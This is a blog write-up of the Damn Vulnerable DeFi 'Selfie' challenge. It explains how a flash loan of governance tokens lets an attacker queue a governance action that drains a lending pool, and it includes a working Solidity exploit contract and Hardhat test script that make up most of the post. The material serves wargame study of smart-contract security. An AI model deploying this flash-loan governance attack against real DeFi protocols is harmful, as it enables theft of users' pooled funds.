---
layout: post
date:   2022-08-19 12:59:00 -0500
categories: DeFi flashloan Governance
title: Damn Vulnerable DeFi - Selfie
---

## Analysis
`SelfiePool` is a simple flash loan pool that allows `onlyGovernance` user to drain the pool

The `flashLoan` routine must be invoked from contract that implements a routine with the signature: `receiveTokens(address, uint256)`

The `drainAllFunds` will drain the funds into a target denoted `receiver` account.

`SimpleGovernance` implements a `governanceToken` used to determine if a user has enough votes to queue an action.
- Q. How does a user acquire `governanceToken`?

    A. By lending from the pool

`actions` is a mapping of ids to `GovernanceAction`

A `GovernanceAction` is an arbitrary routine invoked with some `weiAmount`

An external invoker can interact with the routines `executeAction`, and `queueAction`.

The routine `queueAction` attempts to prevent an invoker from queing an action against the `GovernanceAction`.

The routine `executeAction` routine invokes the arbitrary routine on the target contract denoted `receiver` in the specified action.

## Problem
There exists a sequence of operations that lead to the `drainAllFunds` to be invoked with the attacker's EOA address. This is because `SimpleGovernance`'s `queueAction` does not protect against queuing actions against the pool. `drainAllFunds` is implemented by the pool.

The same token used to manage governance can be flashloaned.

## Exploit

- ExploitSelfie.sol

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract ExploitSelfie {

    using Address for address payable;

    SelfiePool immutable private pool;
    SimpleGovernance immutable private governance;
    DamnValuableTokenSnapshot private governanceToken;

    address immutable private  owner;


    constructor (address poolAddr,
     address govAddr) {
        pool = SelfiePool(poolAddr);
        governance = SimpleGovernance(govAddr);
        owner = msg.sender;
    }

    function exploit(uint256 borrowAmount) external payable {
        // invoke flashloan
        // which should trigger receiveTokens
        pool.flashLoan(borrowAmount);

    }

    function receiveTokens(address target, uint256 amount) external payable {
        require(msg.sender == address(pool));

        governanceToken = DamnValuableTokenSnapshot(target);

        governanceToken.snapshot();

        // Queue an action

        // Set up action.data
        // prepare a call for the drainAllFunds function
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            // receiver is attacker/owner
            owner);

        // invoke queueAction
        governance.queueAction(
            address(pool),
            data,
            0
        );

        // payback the loan
        governanceToken.transfer(address(pool), amount);
    }

}
```

- selfie.challenge.js

```js
    it('Exploit', async function () {

        /** CODE YOUR EXPLOIT HERE */
        const ExploitSelfieFactory = await ethers.getContractFactory("ExploitSelfie", attacker);
        const ExploitSelfie = await ExploitSelfieFactory.deploy(this.pool.address, this.governance.address);

        await ExploitSelfie.connect(attacker).exploit(TOKENS_IN_POOL);

        // advance the time by 2 days
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 day

        await this.governance.executeAction(1);

    });
```

## Explanation
1. `GovernanceAction` can be used to trigger an arbitrary contract call. We need to trigger `drainAllFunds`. This function is owned by `SelfiePool` which will be specified as the queue action receiver.

2. To queue an action, an invoker needs to own more than half of the tokens available. This can be satisfied by borrowing from the pool.

3. The queued action is timed and can be executed after two days. Hence, the loan can be returned in time and the exploit triggered in future.